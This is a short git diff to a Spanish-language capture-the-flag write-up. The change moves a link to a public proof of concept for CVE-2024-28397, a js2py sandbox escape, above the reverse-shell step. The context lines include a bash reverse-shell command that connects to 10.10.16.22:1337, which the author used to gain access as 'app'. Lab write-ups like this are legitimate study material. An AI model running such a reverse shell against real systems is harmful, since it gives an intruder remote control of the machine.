@@ -143,6 +143,8 @@ function f() {
 }
 ```
 
+[Marven CVE-2024-28397](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape)
+
 #### Reverse shell
 
 Modifico un poco el `payload` para que ejecute una `reverse shell` y obtengo acceso como `app`.
@@ -152,8 +154,6 @@ let cmd = "bash -c 'bash -i >& /dev/tcp/10.10.16.22/1337 0>&1'"
 ```
 
 ![Reverse shell](images/codeparttwo_reverse_shell.PNG)
-
-[Marven CVE-2024-28397](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape)
 
 #### Tratamiento de la TTY
 
